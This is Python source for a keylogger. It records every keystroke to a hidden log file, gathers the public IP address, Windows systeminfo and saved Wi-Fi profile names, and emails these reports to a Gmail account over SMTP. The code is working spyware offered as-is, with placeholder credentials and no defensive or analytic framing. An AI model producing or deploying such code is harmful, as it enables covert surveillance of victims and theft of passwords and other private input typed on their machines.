def main():
    def remove(file_name):
        if operating_system == "Windows":
            terminal(f"del {file_name}")

        if operating_system == "Linux":
            terminal(f"rm -fv {file_name}")

    terminal("pip freeze > pip.txt")
    file = open("pip.txt", "r")
    pip_file = file.read()
    file.close()
    remove("pip.txt")

    pip_list = pip_file.split("\n")

    is_module_found = False

    for pip in pip_list:
        if pip == "pynput==1.7.4":
            is_module_found = True
            break

    if not is_module_found:
        print("[INFO]\tInstalling pynput v1.7.4")
        terminal("pip install pynput==1.7.4")

    try:
        # Importing third party library.
        print("[INFO]\tImporting Key, Listener from pynput.keyboard.")
        from pynput.keyboard import Key, Listener

        if IsAccountActive:
            msg = "Keylogger Activated Successfully...\n\n"

            is_module_found = False

            for pip in pip_list:
                if pip == "requests==2.26.0":
                    is_module_found = True
                    break

            if not is_module_found:
                print("[INFO]\tInstalling requests v2.26.0")
                terminal("pip install requests==2.26.0")

            try:
                # Importing third party library.
                print("[INFO]\tImporting get from requests.")
                from requests import get

                print("[INFO]\tImporting ConnectionError from requests.exceptions.")
                from requests.exceptions import ConnectionError

                try:
                    public_ip = get("https://api.ipify.org").text
                    msg = msg + f"Public IP address: {public_ip}\n\n"

                except ConnectionError as connection_error:
                    print(f"[ERROR]\tSorry, an error occurred! {connection_error}")
                    info(f"Error: {connection_error}")
                    Beep(1200, 2000)

            except ModuleNotFoundError as module_error:
                print(f"[ERROR]\tSorry, an error occurred! {module_error}")
                info(f"Error: {module_error}")
                Beep(1200, 2000)

            if operating_system == "Windows":
                terminal("systeminfo > systeminfo.txt")
                file = open("systeminfo.txt", "r")
                msg = msg + f"systeminfo:\n {file.read()}\n\n"
                file.close()
                remove("systeminfo.txt")

                terminal("netsh wlan show profile > netsh.txt")
                file = open("netsh.txt", "r")
                msg = msg + f"netsh wlan show profile:\n {file.read()}\n\n"
                file.close()
                remove("netsh.txt")

            header = (
                f"To: {to_addr}\n"
                f"From: {email}\n"
                f"Subject: Keylogger Status Report\n"
            )

            msg = header + msg

            try:
                print("[INFO]\tSending status email...")
                server.sendmail(email, to_addr, msg)
                print("[INFO]\tEmail sent successfully...")

            except SMTPServerDisconnected as connection_error_1:
                print(f"[ERROR]\tSorry, an error occurred! {connection_error_1}")
                info(f"Error: {connection_error_1}")
                Beep(1200, 2000)

        print("[INFO]\tKeylogger Activated Successfully...")
        info("Keylogger activated...")

        t1 = time()

        if t1 - t0 >= 1:
            print(f"[INFO]\tBooting Time: {t1-t0} s.")

        else:
            print(f"[INFO]\tBooting Time: {(t1-t0)*1000} ms.")

        def on_press(key):
            if key == Key.alt_gr:
                print("[LOG]\talt_gr pressed.")
                info("alt_gr,")

            elif key == Key.alt_l:
                print("[LOG]\talt_l pressed.")
                info("alt_l")

            elif key == Key.backspace:
                print("[LOG]\tbackspace pressed.")
                info("backspace")

            elif key == Key.caps_lock:
                print("[LOG]\tcaps_lock pressed.")
                info("caps_lock")

            elif key == Key.cmd:
                print("[LOG]\tcmd pressed.")
                info("cmd")

            elif key == Key.cmd_r:
                print("[LOG]\tcmd_r pressed")
                info("cmd_r")

            elif key == Key.ctrl_l:
                print("[LOG]\tctrl_l pressed.")
                info("ctrl_l")

            elif key == Key.ctrl_r:
                print("[LOG]\tcrtl_r pressed.")
                info("ctrl_r")

            elif key == Key.delete:
                print("[LOG]\tdelete pressed.")
                info("delete")

            elif key == Key.down:
                print("[LOG]\tdown pressed.")
                info("down")

            elif key == Key.end:
                print("[LOG]\tend pressed.")
                info("end")

            elif key == Key.enter:
                print("[LOG]\tenter pressed.")
                info("enter")

            elif key == Key.esc:
                print("[LOG]\tesc pressed.")
                info("esc")

            elif key == Key.f1:
                print("[LOG]\tf1 pressed.")
                info("f1")

            elif key == Key.f2:
                print("[LOG]\tf2 pressed.")
                info("f2")

            elif key == Key.f3:
                print("[LOG]\tf3 pressed.")
                info("f3")

            elif key == Key.f4:
                print("[LOG]\tf4 pressed.")
                info("f4")

            elif key == Key.f5:
                print("[LOG]\tf5 pressed.")
                info("f5")

            elif key == Key.f6:
                print("[LOG]\tf6 pressed.")
                info("f6")

            elif key == Key.f7:
                print("[LOG]\tf7 pressed.")
                info("f7")

            elif key == Key.f8:
                print("[LOG]\tf8 pressed.")
                info("f8")

            elif key == Key.f9:
                print("[LOG]\tf9 pressed.")
                info("f9")

            elif key == Key.f10:
                print("[LOG]\tf10 pressed.")
                info("f10")

            elif key == Key.f11:
                print("[LOG]\tf11 pressed.")
                info("f11")

            elif key == Key.f12:
                print("[LOG]\tf12 pressed.")
                info("f12")

            elif key == Key.home:
                print("[LOG]\thome pressed.")
                info("home")

            elif key == Key.insert:
                print("[LOG]\tinsert pressed.")
                info("insert")

            elif key == Key.left:
                print("[LOG]\tleft pressed.")
                info("left")

            elif key == Key.media_next:
                print("[LOG]\tmedia_next pressed.")
                info("media_next")

            elif key == Key.media_play_pause:
                print("[LOG]\tmedia_play_pause pressed.")
                info("media_play_pause")

            elif key == Key.media_previous:
                print("[LOG]\tmedia_previous pressed.")
                info("media_previous")

            elif key == Key.media_volume_mute:
                print("[LOG]\tmedia_volume_mute pressed.")
                info("media_volume_mute")

            elif key == Key.media_volume_down:
                print("[LOG]\tmedia_volume_down pressed.")
                info("media_volume_down")

            elif key == Key.media_volume_up:
                print("[LOG]\tmedia_volume_up pressed.")
                info("media_volume_up")

            elif key == Key.menu:
                print("[LOG]\tmenu pressed.")
                info("menu")

            elif key == Key.num_lock:
                print("[LOG]\tnum_lock pressed.")
                info("num_lock")

            elif key == Key.page_down:
                print("[LOG]\tpage_down pressed.")
                info("page_down")

            elif key == Key.page_up:
                print("[LOG]\tpage_up pressed.")
                info("page_up")

            elif key == Key.pause:
                print("[LOG]\tpause")
                info("pause")

            elif key == Key.print_screen:
                print("[LOG]\tprint_screen pressed.")
                info("print_screen")

            elif key == Key.right:
                print("[LOG]\tright pressed.")
                info("right")

            elif key == Key.scroll_lock:
                print("[LOG]\tscroll_lock")
                info("scroll_lock")

            elif key == Key.shift:
                print("[LOG]\tshift pressed.")
                info("shift")

            elif key == Key.shift_r:
                print("[LOG]\tshift_r pressed.")
                info("shift_r")

            elif key == Key.space:
                print("[LOG]\tspace pressed.")
                info("space")

            elif key == Key.tab:
                print("[LOG]\ttab pressed.")
                info("tab")

            elif key == Key.up:
                print("[LOG]\tup pressed.")
                info("up")

            else:
                print(f"[LOG]\t{key} pressed.")
                info(f"{key}")

        def on_release(key):
            if key == Key.esc:
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        un_hide_file("log.txt")

        if IsAccountActive:
            msg = "Keylogger deactivated by user..."

            header = (
                f"To: {to_addr}\n"
                f"From: {email}\n"
                f"Subject: Keylogger Status Report\n"
            )

            msg = header + msg

            try:
                print("[INFO]\tSending status email...")
                server.sendmail(email, to_addr, msg)
                print("[INFO]\tEmail sent successfully...")

            except SMTPServerDisconnected as connection_error_0:
                print(f"[ERROR]\tSorry, an error occurred! {connection_error_0}")
                info(f"Error: {connection_error_0}")
                Beep(1200, 2000)

        print("[INFO]\tKeylogger deactivated...")
        info("Keylogger deactivated...")

        terminate()

    # if pynput not exist.
    except ModuleNotFoundError as module_error:
        print(f"[ERROR]\tSorry, an error occurred! {module_error}")
        info(f"Error: {module_error}")

        un_hide_file("log.txt")

        Beep(1200, 2000)

        terminate()


try:
    # Importing built-in library.
    print("[INFO]\tImporting DEBUG, basicConfig, info from logging.")
    from logging import DEBUG, basicConfig, info

    print("[INFO]\tImporting system as terminal from os.")
    from os import system as terminal

    print("[INFO]\tImporting system as environment from platform.")
    from platform import system as environment

    print(
        "[INFO]\tImporting SMTP, SMTPAuthenticationError, SMTPServerDisconnected from smtplib."
    )
    from smtplib import SMTP, SMTPAuthenticationError, SMTPServerDisconnected

    print("[INFO]\tImporting gaierror from socket.")
    from socket import gaierror

    print("[INFO]\tImporting exit as terminate from sys.")
    from sys import exit as terminate

    print("[INFO]\tImporting time from time.")
    from time import time

    print("[INFO]\tImporting Beep from winsound.")
    from winsound import Beep

    def hide_file(file_name):
        if operating_system == "Windows":
            terminal(f"attrib +h {file_name}")

        if operating_system == "Linux":
            terminal(f"mv -fv {file_name} .{file_name}")

    def un_hide_file(file_name):
        if operating_system == "Windows":
            terminal(f"attrib -h {file_name}")

        if operating_system == "Linux":
            terminal(f"mv -fv .{file_name} {file_name}")

    t0 = time()

    basicConfig(filename="log.txt", level=DEBUG, format="%(asctime)s: %(message)s")

    operating_system = environment()
    print(f"[INFO]\tOperating System: {operating_system}")

    hide_file("log.txt")

    IsAccountActive = False

    email = "$EMAIL"
    password = "$PASSWORD"
    to_addr = "$EMAIL"

    try:
        print("[INFO]\tConnecting to smtp.gmail.com:587")
        server = SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()

        try:
            print("[INFO]\tLogin to Gmail address.")
            server.login(email, password)
            IsAccountActive = True

        except SMTPAuthenticationError as credential_error:
            print(f"[ERROR]\tFailed to login! {credential_error}")
            info(f"Error: {credential_error}")
            Beep(1200, 2000)

    except gaierror as server_error:
        print("[ERROR]\tFailed to connect smtp.gmail.com:587")
        print(f"[ERROR]\tSorry, an error occurred! {server_error}")
        info(f"Error: {server_error}")
        Beep(1200, 2000)

    if __name__ == "__main__":
        main()

except KeyboardInterrupt:
    print("\n[ERROR]\tKeyboardInterrupt occurred! Bye...")
    info("KeyboardInterrupt occurred...")

    if environment() == "Windows":
        terminal("attrib -h log.txt")

    if environment() == "Linux":
        terminal("mv -fv .log.txt log.txt")

    Beep(1200, 2000)

    terminate()
